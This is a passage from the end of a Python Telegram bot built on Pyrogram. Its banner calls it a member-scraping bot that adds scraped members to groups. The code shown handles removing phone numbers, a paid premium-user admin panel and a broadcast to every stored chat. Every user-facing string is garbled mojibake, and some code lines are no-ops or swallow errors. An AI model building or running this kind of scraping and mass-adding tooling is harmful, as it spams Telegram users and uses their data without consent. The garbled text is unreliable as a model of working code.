      await app.send_message(message.chat.id, f"** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è  ü·¥è…¥…¢·¥á Ä ·¥Ä ·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á Ä\n·¥ò ü·¥á·¥ÄÍú±·¥á  ú·¥Ä·¥†·¥á ·¥Ä Íú±·¥ú ôÍú±·¥Ñ Ä…™·¥ò·¥õ·¥è…¥\n200 ÄÍú± ·¥ò·¥á Ä ·¥ç·¥è…¥·¥õ ú\n·¥Ö·¥ç @BT46ER\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      return
   try:
      with open(f"Users/{message.from_user.id}/phone.csv", 'r')as f:
         str_list = [row[0] for row in csv.reader(f)]
         f.closed
         number = await app.ask(chat_id=message.chat.id, text="**Íú±·¥á…¥·¥Ö …¥·¥ú·¥ç ô·¥á Ä ·¥õ·¥è  Ä·¥á·¥ç·¥è·¥†·¥á\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
         print(str_list)
         str_list.remove(number.text)
         with open(f"Users/{message.from_user.id}/1.csv", 'w', encoding='UTF-8') as writeFile:
            writer = csv.writer(writeFile, lineterminator="\n")
            writer.writerows(str_list)
         with open(f"Users/{message.from_user.id}/1.csv") as infile, open(f"Users/{message.from_user.id}/phone.csv", "w") as outfile:
            for line in infile:
               outfile.write(line.replace(",", ""))
         await app.send_message(chat_id=message.chat.id,text="·¥Ö·¥è…¥·¥á Íú±·¥ú·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è")
   except Exception as a:
      pass
 except Exception as e:
   await app.send_message(message.chat.id, f"**Error: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   return

# ------------------------------- Admin Pannel --------------------------------- #
@app.on_message(filters.private & filters.command('ishan'))
async def subscribers_count(lel, message):
   a= await Subscribe(lel, message)
   if a==1:
      return
   if message.from_user.id in OWNER:
      but = InlineKeyboardMarkup([[InlineKeyboardButton("·¥úÍú±·¥á ÄÍú±‚úÖ", callback_data="Users")], [InlineKeyboardButton(" ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥ÄÍú±·¥õüíØ", callback_data="Broadcast")],[InlineKeyboardButton("·¥Ä·¥Ö·¥Ö ·¥úÍú±·¥á Ä", callback_data="New")], [InlineKeyboardButton("·¥Ñ ú·¥á·¥Ñ·¥ã ·¥úÍú±·¥á ÄÍú±", callback_data="Check")]])
      await app.send_message(chat_id=message.chat.id,text=f"** ú…™** `{message.from_user.first_name}` **!\n\n·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥…¥·¥á ü ·¥èÍú∞ …™…¥·¥Ö·¥ú·¥Ñ·¥á·¥Ö  ô·¥è·¥õ\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**", reply_markup=but)
   else:
      await app.send_message(chat_id=message.chat.id,text="** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥õ ·¥è·¥°…¥·¥á Ä ·¥èÍú∞  ô·¥è·¥õ \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")



# ------------------------------- Buttons --------------------------------- #
@app.on_callback_query()
async def button(app, update):
   k = update.data
   if "Login" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /login ·¥õ·¥è  ü·¥è…¢…™…¥ ·¥Ä…¥·¥Ö ·¥Ñ ú·¥á·¥Ñ·¥ã Íú±·¥õ·¥Ä·¥õÍú± ·¥èÍú∞ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Ish" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /phonesee ·¥õ·¥è  ü·¥è…¢…™…¥ ·¥Ä…¥·¥Ö ·¥Ñ ú·¥á·¥Ñ·¥ã Íú±·¥õ·¥Ä·¥õÍú± ·¥èÍú∞ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Remove" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /remove ·¥õ·¥è  ü·¥è…¢…™…¥ ·¥Ä…¥·¥Ö ·¥Ñ ú·¥á·¥Ñ·¥ã Íú±·¥õ·¥Ä·¥õÍú± ·¥èÍú∞ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Adding" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /adding ·¥õ·¥è Íú±·¥õ·¥Ä Ä·¥õ ·¥Ä·¥Ö·¥Ö…™…¥…¢ Íú∞ Ä·¥è·¥ç  ü·¥è…¢…™…¥‚úÖ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Edit" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /phone ·¥õ·¥è  ü·¥è…¢…™…¥ ·¥Ä…¥·¥Ö ·¥Ñ ú·¥á·¥Ñ·¥ã Íú±·¥õ·¥Ä·¥õÍú± ·¥èÍú∞ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**·¥õ ú·¥á Ä·¥á …™Íú± …¥·¥è·¥õ ú…™…¥…¢ …¥·¥è ·¥ç·¥è Ä·¥á..!\n·¥ä·¥úÍú±·¥õ ·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥ /start ·¥õ·¥è …¢·¥è  ú·¥è·¥ç·¥á.\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"·¥ò ü·¥á·¥ÄÍú±·¥á ·¥°·¥Ä…™·¥õ...")
      messages = await users_info(app)
      await msg.edit(f"Total:\n\n·¥úÍú±·¥á ÄÍú± - {messages[0]}\n ô ü·¥è·¥Ñ·¥ã·¥á·¥Ö - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text="**Íú±·¥á…¥·¥Ö ·¥úÍú±·¥á Ä …™·¥Ö ·¥èÍú∞ …¥·¥á·¥° ·¥úÍú±·¥á Ä\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUM.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="·¥Ö·¥è…¥·¥á Íú±·¥ú·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**·¥ò Ä·¥á·¥ç…™·¥ú·¥ç ·¥úÍú±·¥á ÄÍú±**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+="\n\n**·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNER:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("·¥úÍú±·¥á ÄÍú±‚úÖ", callback_data="Users")], [InlineKeyboardButton(" ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥ÄÍú±·¥õüíØ", callback_data="Broadcast")],[InlineKeyboardButton("·¥Ä·¥Ö·¥Ö ·¥úÍú±·¥á Ä", callback_data="New")], [InlineKeyboardButton("·¥Ñ ú·¥á·¥Ñ·¥ã ·¥úÍú±·¥á ÄÍú±", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥…¥·¥á ü ·¥èÍú∞ …™…¥·¥Ö·¥ú·¥Ñ·¥á·¥Ö  ô·¥è·¥õ\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text="** è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥õ ·¥è·¥°…¥·¥á Ä ·¥èÍú∞  ô·¥è·¥õ \n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text="**…¥·¥è·¥° ·¥ç·¥á ·¥ç·¥áÍú±Íú±·¥Ä…¢·¥á Íú∞·¥è Ä  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥ÄÍú±·¥õ\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"Íú±·¥ú·¥Ñ·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥ÄÍú±·¥õ·¥á·¥Ö ·¥õ·¥è {a} ·¥Ñ ú·¥Ä·¥õÍú±\nÍú∞·¥Ä…™ ü·¥á·¥Ö - {b} ·¥Ñ ú·¥Ä·¥õÍú± !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**·¥á Ä Ä·¥è Ä: {e}\n\n·¥ç·¥Ä·¥Ö·¥á ·¥°…™·¥õ ú ‚ù§Ô∏è  ô è @BT46ER**")




text = """
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïó„Ö§Members 
‚ïö‚ïê‚ïó‚ïî‚ïê‚ïù Scraping Bot
‚ïî‚ïê‚ï£‚ï†‚ïê‚ïó
‚ïë‚ïî‚ï£‚ï†‚ïó‚ïë„Ö§Induced
‚ïë‚ïö‚ï£‚ï†‚ïù‚ïë Scraper Bot
‚ïö‚ïê‚ï£‚ï†‚ïê‚ïù
‚ïî‚ïê‚ïù‚ïö‚ïê‚ïó 
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù 
"""
print(text)
print("…™…¥·¥Ö·¥ú·¥Ñ·¥á·¥Ö ·¥Ä·¥Ö·¥Ö…™…¥…¢ Íú±·¥õ·¥Ä Ä·¥õ·¥á·¥Ö Íú±·¥ú·¥Ñ·¥áÍú±Íú±Íú∞·¥ú ü ü è........")
app.run()
